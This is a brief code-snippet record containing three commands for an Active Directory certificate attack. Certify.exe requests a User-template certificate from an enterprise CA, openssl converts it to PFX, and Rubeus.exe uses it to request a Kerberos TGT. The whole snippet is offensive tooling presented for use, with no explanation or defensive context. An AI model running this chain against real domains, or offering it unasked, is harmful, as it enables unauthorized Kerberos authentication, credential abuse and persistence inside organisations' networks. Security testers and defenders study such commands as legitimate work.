---
id: e694f20f-db7e-4911-b079-b640b86daabe
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:28.361098+00:00'
updated_at: '2023-04-10T20:37:28.987839+00:00'
---

# Code Snippet e694f20f

**Language**: ps1

```ps1
# Request a certificate for the User template
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User

# Convert the certificate for Rubeus
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request a TGT using the certificate
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```
